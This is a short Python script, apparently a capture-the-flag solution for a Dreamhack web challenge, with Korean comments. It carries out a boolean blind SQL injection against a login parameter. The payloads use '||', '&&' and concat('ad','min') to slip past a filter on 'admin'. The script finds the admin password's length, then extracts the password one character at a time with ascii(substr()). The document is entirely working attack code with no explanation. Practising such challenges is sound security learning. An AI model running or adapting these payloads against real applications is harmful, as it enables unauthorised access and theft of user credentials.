import string
from requests import get

url="http://host3.dreamhack.games:20219/"

#패스워드 길이
pw_length=0
while True:
    pw_length+=1
    param={
        'uid':f"'||(uid=concat('ad','min'))&&(char_length(upw))={pw_length}#" 
    }
    if 'admin' in get(url,params=param).text:
        break
print(f"pw length:{pw_length}")


#패스워드
flag=""
for i in range(1,pw_length+1):
    for j in range(47,127):
        param={
            'uid':f"'||(uid=concat('ad','min'))&&(ascii(substr(upw,{i},1))={j})#"
        }
        if 'admin' in get(url,params=param).text:
            flag += chr(j)
            print(flag)
            break

print(f"pw:{flag}")

